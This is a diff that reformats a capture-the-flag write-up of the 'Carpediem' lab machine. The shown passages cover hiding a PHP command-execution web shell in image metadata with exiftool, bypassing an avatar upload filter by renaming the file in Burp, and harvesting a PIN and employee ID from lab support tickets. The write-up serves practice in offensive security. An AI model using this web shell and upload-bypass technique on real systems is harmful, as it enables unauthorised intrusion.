@@ -125,28 +125,36 @@ Doing a edit, we can see a new interesting parameter in Burp - `login_type=2`. C
 ### Step 2 - Find the vuln
 Going through the admin panel the options are slim, at first glance it looks like we have a lot of options but in reality they've removed all the _update/save_ buttons only giving access to few functions.
 
-**(1)** We can create a new bike with text + image<br>
-**(2)** Edit previously created bikes<br>
-**(3)** Print a Booking Report PDF<br>
-**(4)** Edit our user profile and add avatar image<br>
+**(1)** We can create a new bike with text + image
+
+**(2)** Edit previously created bikes
+
+**(3)** Print a Booking Report PDF
+
+**(4)** Edit our user profile and add avatar image
+
 
 Looking on bookings we find 5 entries, and from the data a new name: `jhammond@carpediem.htb`.
 Going to edit user profile I try to upload a malicious jpg containing php code, but this does nothing. 
 
 We can bypass this by simply capturing the request in burp and removing `.jpg` from the request body, and the file will be uploaded as a ``.php``. 
 ```bash
-➜  carpediem exiftool -DocumentName="<h1>0xPThree - exploit.se<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" exploit.jpg 
+➜  carpediem exiftool -DocumentName="<h1>0xPThree - exploit.se
+<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" exploit.jpg 
     1 image files updated
 ➜  carpediem mv exploit.jpg exploit.php.jpg
 ```
 
-From Burp intercept change filename:<br>
+From Burp intercept change filename:
+
 ![](images/carpediem08.png)
 
-And our avatar should now be broken by the webshell.<br>
+And our avatar should now be broken by the webshell.
+
 ![](images/carpediem09.png)
 
-Right-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell. <br>
+Right-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell. 
+
 ![](images/carpediem10.png)
 
 The uploaded php file is removed after a few minutes, so create a simple reverse shell:
@@ -378,8 +386,10 @@ Before moving on, lets see if we can find anything interesting from the reported
 {
 	"_id" : ObjectId("624465135596178468330932"),
 	"issue" : "<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n",
-			"comment" : "<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n"
-			"comment" : "<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n"
+			"comment" : "<p>Hey Adeanna,
+I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n"
+			"comment" : "<p>Thanks Robert,
+Last 4 of employee ID is 9650.</p>\n"
 			"comment" : "<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n"
 }
 {
@@ -391,7 +401,8 @@ Before moving on, lets see if we can find anything interesting from the reported
 	"_id" : ObjectId("62478d83eadb13001b66b62c"),
 	"subject" : "Need help building the CMS",
 	"issue" : "<p>Hey Jeremy, <br />Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.</p>\n",
-			"comment" : "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.<br>Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n"
+			"comment" : "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.
+Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n"
 			"comment" : "<p>Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.</p>\n"
 
 }
@@ -400,7 +411,8 @@ Before moving on, lets see if we can find anything interesting from the reported
 The information about the new Network Engineer and the last 4 digits of his employee ID, 9650, and pincode, 2022, might come in handy later. Lets move on with the extracted accessTokens. 
 
 ### Step 5 - Trudesk
-Setup Burp for upstream socks proxy (User options > SOCKS Proxy) and browse to `https://172.17.0.2` we find `backdrop.carpediem.htb`. <br>
+Setup Burp for upstream socks proxy (User options > SOCKS Proxy) and browse to `https://172.17.0.2` we find `backdrop.carpediem.htb`. 
+
 ![](images/carpediem11.png)
 
 
